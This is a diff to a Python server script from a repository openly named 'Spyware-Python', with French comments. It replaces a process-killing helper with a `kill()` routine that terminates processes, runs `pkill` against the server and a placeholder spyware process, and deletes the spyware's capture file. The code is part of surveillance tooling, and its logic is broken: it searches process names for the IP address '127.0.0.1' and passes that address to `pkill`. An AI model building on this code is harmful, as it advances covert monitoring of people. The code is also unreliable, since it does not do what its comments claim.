@@ -4,6 +4,9 @@ LIEN GIT : https://github.com/mariam-rg/Spyware-Python-.git
 import psutil
 import socket
 import threading
+import os
+import CLT
+import subprocess
 
 # Server configuration
 SERVER_HOST = '127.0.0.1'
@@ -55,15 +58,28 @@ def closeAllPort():
 
 
 
-def kill_instances(process_name):
-    for process in psutil.process_iter(['pid', 'name']):
-        if process.info['name'] == process_name:
-            try:
-                pid = process.info['pid']
-                psutil.Process(pid).terminate()
-                print(f"Process {process_name} with PID {pid} terminated.")
-            except Exception as e:
-                print(f"Error terminating process {process_name} with PID {pid}: {e}")
+def kill():
+    try:
+        # Fermer tous les ports sur lesquels le serveur écoute
+        for process in psutil.process_iter(['pid', 'name']):
+            if SERVER_HOST in process.info['name'].lower():  
+                print(f"Arrêt du processus {process.info['pid']}")
+                process.send_signal(psutil.signal.SIGTERM)
+        
+        # Arrêter toutes les instances du serveur en cours
+        subprocess.run(['pkill', '-f', SERVER_HOST])
+
+        # Avertir le spyware de s'arrêter
+        subprocess.run(['pkill', '-f', 'spyware_process'])#Remlacer par nom du spyware
+
+
+        # Supprimer la capture
+        os.remove(CLT.writeFile())  
+        print("Capture supprimée avec succès.")
+        
+        print("Opérations terminées avec succès.")
+    except Exception as e:
+        print(f"Erreur lors de l'arrêt : {e}")
 
 def help():
     print("Fonctions disponibles :")
